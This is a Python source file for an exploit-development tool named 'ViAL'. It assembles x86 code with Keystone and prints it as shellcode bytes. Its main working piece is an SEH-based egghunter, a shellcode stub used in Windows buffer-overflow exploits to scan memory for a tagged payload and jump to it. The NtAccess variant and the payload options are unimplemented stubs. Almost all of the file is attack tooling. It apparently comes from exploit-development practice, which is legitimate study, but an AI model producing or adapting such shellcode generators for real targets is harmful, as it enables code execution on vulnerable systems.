#!/usr/bin/python

import argparse
import sys
from keystone import *
from rich.console import Console

console = Console()

BANNER = '''[green]
Y88b      / 888      e      888     
 Y88b    /  888     d8b     888     ViAL ---
  Y88b  /   888    /Y88b    888     venomous injected assembly library
   Y888/    888   /  Y88b   888     
    Y8/     888  /____Y88b  888     
     Y      888 /      Y88b 888____
[/green]'''
DEFAULT_TAG = 'y0y0'

def tag_to_hex(s):
    if len(s) == 4:
        tag = s
    else:
        tag = DEFAULT_TAG
    return f"0x{''.join([hex(ord(ch)).split('x')[1] for ch in tag][::-1])}"

def print_shellcode(code):
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(code)
    console.print("[INFO] Encoded %d instructions..." % count)

    shellcode = ""
    for dec in encoding: 
        shellcode += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
    console.print("[INFO] buf = (\"" + shellcode + "\")")

def generate_egghunter_seh(tag):
    egg_hunter = f'''
        start: 									 
            jmp get_seh_address 				;
        build_exception_record: 				
            pop ecx 							;
            mov eax, {tag_to_hex(tag)} 	;
            push ecx 							;
            push 0xffffffff 					;
            xor ebx, ebx 						;
            mov dword ptr fs:[ebx], esp 		;
            sub ecx, 0x04						;
            add ebx, 0x04						;
            mov dword ptr fs:[ebx], ecx			;
        is_egg: 								
            push 0x02 							;
            pop ecx 							;
            mov edi, ebx 						;
            repe scasd 							;
            jnz loop_inc_one 					;
            jmp edi 							;
        loop_inc_page: 							 
            or bx, 0xfff 						;
        loop_inc_one: 							 
            inc ebx 							;
            jmp is_egg 							;
        get_seh_address: 						
            call build_exception_record 		;
            push 0x0c 							;
            pop ecx 							;
            mov eax, [esp+ecx] 					;
            mov cl, 0xb8						;
            add dword ptr ds:[eax+ecx], 0x06	;
            pop eax 							;
            add esp, 0x10 						;
            push eax 							;
            xor eax, eax 						;
            ret 								; 
    '''
    print_shellcode(egg_hunter)

def generate_egghunter_ntaccess(tag):
    pass

def main(args):
    console.print(BANNER)

    if args.egghunter:
        tag = args.tag
        op = args.egghunter[0]

        if len(tag) != 4:
            tag = DEFAULT_TAG
            console.print("[yellow][WARN][/yellow] Tag must be four (4) characters!")
            console.print(f"[INFO] Using default tag {tag}")

        console.print(f"[INFO] Generating {op} egghunter with tag {tag_to_hex(tag)} ({tag})")

        if (op.lower() == 'seh'):
            generate_egghunter_seh(tag)
        elif (op.lower() == 'ntaccess'):
            generate_egghunter_ntaccess(tag)
        else:
            console.print(f"[WARN] No matching egghunter found for '{op}'!")

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description = "Creates a 32-bit Windows assembly payload"
    )

    exclusive_group = parser.add_mutually_exclusive_group()
    exclusive_group.add_argument(
        '--egghunter',
        help = "Generate a 32-bit Windows SEH or NtAccess egghunter",
        action = 'store',
        type = str,
        nargs = 1,
    )
    exclusive_group.add_argument(
        '--payload',
        help = "Generate a 32-bit Windows payload",
        action = 'store',
        type = str,
        nargs = 1,
    )
    exclusive_group.add_argument(
        '--list',
        help = "List available payloads",
        action = 'store_true',
    )

    parser.add_argument(
        '--tag',
        help = f"Egghunter tag to use (default: {DEFAULT_TAG})",
        action = 'store',
        type = str,
        default = DEFAULT_TAG
    )

    if len(sys.argv) > 1:
        args = parser.parse_args()
        main(args)
    else:
        parser.print_help()
        sys.exit()